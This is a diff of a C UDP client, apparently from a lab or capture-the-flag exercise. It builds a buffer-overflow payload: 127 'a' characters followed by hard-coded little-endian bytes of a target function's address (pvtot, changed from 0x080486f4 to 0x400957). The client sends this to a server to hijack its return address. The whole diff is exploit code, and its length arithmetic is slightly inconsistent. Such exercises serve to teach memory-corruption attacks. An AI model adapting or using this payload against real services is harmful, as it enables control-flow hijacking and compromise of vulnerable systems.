@@ -61,20 +61,21 @@ int main(int argc, char **argv) {
     //printf("Please enter msg: ");
     
     strcpy(buf, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");//127bytes : buffer Size
+	
 	//function 080486f4 <pvtot>:
+	//<pvot> 0000000000400957
 	//map 80486db to 80486f4
 	 int getN = strlen(buf);
 	 //address of <pvtot> 
-	 buf[++getN]  = 0xf4;
-    buf[++getN]  = 0x86;
-    buf[++getN]  = 0x04;
-    buf[++getN]  = 0x08;
-	 //buf[strlen(buf)+4] = 0x00;
-	 //buf[strlen(buf)+5] = 0x00;
+	 buf[++getN]  = 0x57;
+    buf[++getN]  = 0x09;
+    buf[++getN]  = 0x40;
+    
+	
 	
     /* send the message to the server */
     serverlen = sizeof(serveraddr);
-    n = sendto(sockfd, buf, ++getN, 0, &serveraddr, serverlen);
+    n = sendto(sockfd, buf, ++getN+1, 0, &serveraddr, serverlen);
     if (n < 0) 
       error("ERROR in sendto");
     
